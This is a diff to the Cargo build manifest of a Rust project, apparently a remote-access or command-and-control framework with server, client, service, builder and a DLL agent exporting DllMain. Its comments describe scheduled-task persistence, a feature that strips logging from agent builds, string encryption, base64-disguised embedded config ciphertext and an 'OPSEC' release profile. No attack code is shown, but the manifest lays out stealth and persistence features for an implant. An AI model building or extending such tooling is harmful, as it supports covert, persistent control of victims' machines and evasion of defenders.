@@ -1,5 +1,5 @@
 [workspace]
-members = ["strcrypt"]
+members = ["strcrypt", "client_dll"]
 
 [package]
 name = "rcm"
@@ -26,9 +26,10 @@ path = "src/bin/server.rs"
 name = "client"
 path = "src/bin/client.rs"
 
-[[bin]]
-name = "client_dll"
-path = "src/bin/client_dll.rs"
+# client_dll is NOT a bin target: cargo rejects crate-type on [[bin]], so
+# the agent DLL lives in the client_dll/ workspace member as a cdylib (its
+# artifact is a real PE DLL with a DllMain export). Build it with
+# `cargo build -p client_dll`.
 
 [[bin]]
 name = "client_service"
@@ -49,6 +50,7 @@ path = "src/bin/builder.rs"
 agent-quiet = ["tracing/release_max_level_off", "log/release_max_level_off"]
 
 [dependencies]
+hyper       = { version = "0.14", features = ["http1","server","client","runtime","tcp"] }
 log = "0.4"  # direct dep so agent-quiet can set its max-level filter
 # Async Core
 tokio = { version = "1", features = ["full"] }
@@ -136,7 +138,7 @@ image = "0.24"
 # arboard moved to [target.'cfg(not(target_env = "musl"))'.dependencies] below
 
 
-# Windows COM (ITaskService — scheduled task persistence, MSVC native builds only).
+# Windows COM (ITaskService - scheduled task persistence, MSVC native builds only).
 # MinGW / cross-compiled agents (x86_64-pc-windows-gnu) fall back to schtasks.exe.
 [target.'cfg(all(target_os = "windows", target_env = "msvc"))'.dependencies]
 windows = { version = "0.52", features = [
@@ -149,11 +151,13 @@ windows = { version = "0.52", features = [
 serde_json = "1.0"
 hex = "0.4"
 rand = "0.8"
+# Text-shapes the embedded config ciphertext (base64 carrier in the
+# generated config code instead of a raw byte array).
+base64 = "0.21"
 
 [dev-dependencies]
 tempfile    = "3"
 sha2        = "0.10"
-hyper       = { version = "0.14", features = ["http1","server","client"] }
 tower       = { version = "0.4", features = ["util"] }
 
 # --- OPSEC release profile ----------------------------------------------------
